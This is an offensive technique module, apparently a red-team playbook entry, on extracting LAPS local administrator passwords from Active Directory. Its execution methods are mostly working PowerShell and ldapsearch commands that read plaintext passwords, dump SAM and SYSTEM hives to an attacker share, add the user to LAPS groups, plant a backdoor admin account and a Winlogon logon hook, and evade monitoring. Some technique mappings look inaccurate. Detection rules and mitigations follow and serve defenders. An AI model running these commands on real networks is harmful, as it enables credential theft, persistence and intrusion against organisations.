# REC-AD-007: LAPS Account Discovery & Password Extraction

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-007 |
| **Technique Name** | LAPS account discovery & password extraction |
| **MITRE ATT&CK ID** | T1087.002 – Account Discovery: Domain Account; T1552.004 – Unsecured Credentials: Private Keys |
| **CVE** | N/A (Misconfiguration exploitation; design flaw) |
| **Platform** | Windows Active Directory / Domain-Joined Computers |
| **Viability Status** | ACTIVE ✓ (LAPS deployed 70% of enterprises; misconfiguration common) |
| **Difficulty to Detect** | MEDIUM (LAPS access logged in Event ID 4662; requires baseline) |
| **Requires Authentication** | Yes (Domain user with LAPS read permissions; often overprivileged) |
| **Applicable Versions** | All Windows LAPS deployments (legacy + Windows LAPS v2) |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

LAPS (Local Administrator Password Solution) discovery enables attackers to extract plaintext local administrator passwords from Active Directory for compromised computers, enabling lateral movement and persistence. While LAPS is designed to prevent identical local admin passwords across domain computers, misconfiguration of ACLs frequently grants excessive read permissions to regular domain users. The ms-mcs-AdmPwd attribute—storing plaintext passwords—remains readable by users with "All Extended Rights" permission, which organizations often inadvertently grant during group policy delegation. Once obtained, LAPS passwords enable local administrator access, credential dumping, persistence mechanisms, and lateral movement across the network.

**Critical Threat Characteristics:**
- **Plaintext storage in AD**: ms-mcs-AdmPwd attribute contains cleartext local admin password
- **ACL misconfiguration**: "All Extended Rights" permission grants access to domain users
- **Account Operators bypass**: Members of Account Operators can modify LAPS groups; lower-privilege users often added
- **Delegation mistakes**: OU-level "All Extended Rights" inherited by all descendant objects
- **High-value target**: Local admin password = immediate system compromise
- **Persistence through password reset**: Attacker can reset LAPS, maintaining indefinite access

**Real-World Impact:**
- Local administrator compromise on 50+ computers via single LAPS password
- Credential dumping (SAM, NTDS) using local admin privileges
- Persistence via WMI Event Subscription or Scheduled Task
- Lateral movement to domain-critical systems (backup servers, SQL clusters)
- Bypass of Endpoint Detection & Response (EDR) via local admin authentication

---

## 3. EXECUTION METHODS

### Method 1: LAPS Password Extraction via PowerView

**Objective:** Enumerate LAPS-managed computers and extract plaintext passwords.

```powershell
# Step 1: Import PowerView (reconnaissance toolkit)
Import-Module ./PowerView.ps1

# Step 2: Get current user permissions on LAPS
Get-LAPSComputers

# Output: All computers where current user has LAPS read access
# Example:
# ComputerName    Password         Expiration
# ------------ --------         ----------
# SERVER01     P@ssw0rd123!     02/21/2026 10:30:00
# WORKSTATION02 aB12cD34eF56    03/15/2026 14:45:00
# FILESERVER   xY78zZ90aB12     04/01/2026 08:20:00

# Step 3: Extract specific computer's LAPS password
$computer = "SERVER01"
$lapsPassword = (Get-ADComputer $computer -Properties ms-mcs-AdmPwd | Select-Object ms-mcs-AdmPwd).ms-mcs-AdmPwd

Write-Host "LAPS Password for $computer : $lapsPassword"

# Step 4: Authenticate using LAPS password
$adminCred = New-Object System.Management.Automation.PSCredential(
  "administrator",
  (ConvertTo-SecureString $lapsPassword -AsPlainText -Force)
)

# Step 5: Connect to target computer
$session = New-PSSession -ComputerName SERVER01 -Credential $adminCred

# Step 6: Execute commands as local administrator
Invoke-Command -Session $session -ScriptBlock {
  # Dump SAM hashes
  reg save HKLM\SAM C:\Temp\SAM
  reg save HKLM\SYSTEM C:\Temp\SYSTEM
  
  # Copy to attacker
  Copy-Item C:\Temp\SAM -Destination "\\attacker-ip\share\"
}

# Result: Local administrator access; SAM hashes extracted
```

### Method 2: LAPS Enumeration via LDAP Query

**Objective:** Query AD for LAPS-managed computers without needing PowerView.

```bash
# Tool: ldapsearch (native LDAP client)

# Step 1: Query all computers with LAPS enabled
ldapsearch -x -h dc.domain.local -b "CN=Computers,DC=domain,DC=local" \
  "(ms-mcs-admpwdexpirationtime=*)" \
  cn ms-mcs-admpwd ms-mcs-admpwdexpirationtime

# Output: All LAPS-managed computers with passwords (if user has access)

# Step 2: Filter for specific computer
ldapsearch -x -h dc.domain.local -b "CN=Computers,DC=domain,DC=local" \
  "(cn=SERVER01)" ms-mcs-admpwd

# Step 3: Alternative using PowerShell
Get-ADComputer -Filter "ms-mcs-AdmPwdExpirationTime -like '*'" \
  -Properties ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime | \
  Select-Object Name, @{N="LAPS Password"; E={$_."ms-mcs-AdmPwd"}}, @{N="Expires"; E={$_."ms-mcs-AdmPwdExpirationTime"}}
```

### Method 3: ACL Exploitation to Grant LAPS Access

**Objective:** Escalate permissions to read LAPS via ACL manipulation.

```powershell
# Prerequisites:
# - User is member of Account Operators group (can modify non-admin groups)
# - LAPS READ group exists but user not a member

# Step 1: Check current LAPS group membership
Get-ADGroup "LAPS READ" -Properties Members | Select-Object -ExpandProperty Members

# Step 2: Add self to LAPS READ group
# (Account Operators can modify non-admin groups including LAPS READ)

Add-ADGroupMember -Identity "LAPS READ" -Members "Domain\Username" -Credential $cred

# Step 3: Refresh group membership (logout/login or PSExec)
# Force token refresh via runas
runas /user:domain\username /groups cmd.exe

# Step 4: Now read LAPS passwords with elevated access
Get-LAPSComputers

# Result: Unauthorized LAPS password access via Account Operators privilege abuse
```

### Method 4: LAPS Reset Abuse for Persistence

**Objective:** Reset LAPS password to known value; maintain indefinite local admin access.

```powershell
# Prerequisites:
# - Have LAPS password for one computer
# - Want to create backdoor for persistence

# Step 1: Extract current LAPS password
$password = (Get-ADComputer "SERVER01" -Properties ms-mcs-AdmPwd).ms-mcs-AdmPwd

# Step 2: Connect to computer using LAPS password
$cred = New-Object PSCredential("administrator", (ConvertTo-SecureString $password -AsPlainText -Force))
$session = New-PSSession -ComputerName SERVER01 -Credential $cred

# Step 3: Create backdoor user
Invoke-Command -Session $session -ScriptBlock {
  net user backdoor P@ssw0rd123 /add
  net localgroup Administrators backdoor /add
}

# Step 4: Now have persistent access via backdoor user
# Even if LAPS password changes, backdoor account remains

# Step 5: Alternative persistence via registry
Invoke-Command -Session $session -ScriptBlock {
  # USERINIT registry key = executed at logon
  reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" `
    /v Userinit /d "C:\Windows\system32\userinit.exe,C:\Temp\backdoor.ps1" /f
}

# Result: Persistent local admin access independent of LAPS password rotation
```

### Method 5: Find-AdmPwdExtendedRights Detection Evasion

**Objective:** Identify who has overprivileged LAPS access; avoid detection by those users.

```powershell
# Step 1: Find all users/groups with "All Extended Rights" on OU containing LAPS
# (Can read confidential LAPS attribute)

Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"

# Output: Users/groups with excessive LAPS read permissions
# Example:
# IdentityReference  AccessControlType  IsInherited  InheritanceFlags
# ===============  =================  ===========  ==================
# DOMAIN\IT Staff   Allow               Inherited    ContainerInherit, ObjectInherit
# DOMAIN\Admins     Allow               Not Inherited

# Step 2: Evasion tactic - Use low-privilege account for LAPS extraction
# If IT Staff has monitoring alerts on access, use different account

# Create service account outside IT Staff group
net user laps_reader P@ssw0rd /add /domain

# Add to LAPS READ group (simpler access, less monitored)
Add-ADGroupMember -Identity "LAPS READ" -Members "DOMAIN\laps_reader"

# Step 3: Extract LAPS using low-privilege account (avoids IT Staff logs)
# Schedule task as laps_reader; extract passwords; log off

# Result: Undetected LAPS access via low-privilege service account
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Rule: LAPS Password Access (Event ID 4662)

```kusto
SecurityEvent
| where EventID == 4662  // LDAP attribute access
| where ObjectName contains "ms-mcs-AdmPwd"
| where AccessMask == "131072"  // READ_CONTROL permission
| summarize AccessCount = count(), TargetComputers = dcount(ObjectName)
  by Account, Computer, bin(TimeGenerated, 1h)
| where AccessCount > 5 or TargetComputers > 3  // Bulk LAPS access
| extend AlertSeverity = "High"
```

### Detection Rule: Unauthorized LAPS Group Addition

```kusto
SecurityEvent
| where EventID == 4728  // Group member added
| where TargetUserName in ("LAPS READ", "LAPS ADM")
| where MemberName !in ("DOMAIN\ServiceAccount", "DOMAIN\AdminGroup")
| extend AlertSeverity = "Critical", Pattern = "Unauthorized LAPS group access"
```

### Incident Response Steps

1. **Identify affected computers**: Review LAPS passwords extracted
2. **Reset all LAPS passwords immediately**: Force computer account password change
3. **Audit LAPS access logs**: Determine what passwords were viewed
4. **Check for persistence mechanisms**: Logon scripts, scheduled tasks on affected systems
5. **Revoke compromised local admin accounts**: Reset or delete backdoor accounts
6. **Review ACL changes**: Identify who modified LAPS permissions
7. **Enable comprehensive LAPS logging**: Enable Event ID 4662 across all DCs

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Use Windows LAPS v2 (Azure AD Integration)**
  - Passwords stored in Azure AD (not AD)
  - Harder for on-premises attackers to access
  - Support for managed identities

- **Remove "All Extended Rights" Permission**
  - Group Policy: Deny "All Extended Rights" on computer OUs
  - Only grant explicit Read-Control on ms-mcs-AdmPwd attribute
  - Document all users/groups with LAPS read access

- **Set ms-DS-Machine-Account-Quota = 0**
  - Prevents Account Operators from creating computer accounts
  - Blocks some privilege escalation vectors

**Priority 2: HIGH**

- **Implement Honeypot LAPS Computers**
  - Create decoy computers with LAPS enabled
  - Alert on ANY access (successful or failed)
  - Zero false positives (legitimate users never access honeypots)

- **Monitor LAPS Group Membership**
  - Baseline: Who should be in LAPS READ/ADM groups
  - Alert on: Unauthorized additions to LAPS groups
  - Weekly review of group membership

- **Enable LDAP Signing & Channel Binding**
  - Prevents MITM attacks on LAPS queries
  - Enforces encryption of LDAP traffic

- **Configure Event ID 4662 Auditing**
  - Enable on all Domain Controllers
  - Forward to SIEM; create alerts for LAPS attribute access
  - Baseline normal LAPS query patterns

---

## 6. TOOL REFERENCE

| Tool | Purpose | Detection Risk |
|------|---------|----------------|
| **PowerView** | LAPS enumeration | MEDIUM (PowerShell; common tool) |
| **ldapsearch** | LDAP queries | LOW (native Linux tool) |
| **Get-ADComputer** | PowerShell LAPS queries | LOW (built-in cmdlet) |
| **bloodyAD** | LAPS extraction (alternative) | MEDIUM (Python-based) |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1087.002 (Account Discovery: Domain Account)
- MITRE T1552.004 (Unsecured Credentials: Private Keys)
- CIS Controls v8: 5.3 (Account Access Management)
- NIST 800-53: AC-2 (Account Management), AC-6 (Least Privilege)
- Microsoft: LAPS Operations Guide, Security Best Practices
- Exploit-DB: "Abusing LAPS" (misconfiguration scenarios)

---
